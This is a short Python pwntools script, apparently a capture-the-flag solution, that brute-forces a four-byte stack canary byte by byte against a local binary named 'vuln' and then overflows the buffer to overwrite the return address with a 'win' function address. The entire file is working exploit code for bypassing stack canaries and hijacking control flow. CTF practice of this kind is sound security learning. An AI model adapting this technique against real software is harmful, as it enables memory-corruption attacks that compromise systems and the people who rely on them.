from pwn import *

# context.log_level = 'debug'

winAddr = 0x080486eb

canary = ''
for i in range(1, 5):
  for e in range(256):
    sh = process('./vuln')
    sh.sendlineafter('> ', str(32+i))
    sh.sendafter('> ', 'a'*32+canary+chr(e))
    output = sh.recvall()
    if 'Stack' not in output:
      print output
      canary += chr(e)
      break
print canary

# canary = 'abcd'

sh = process('./vuln')
sh.sendlineafter('> ', str(200))
sh.sendlineafter('> ', 'a'*32+canary+'a'*16+p32(winAddr))
sh.interactive()
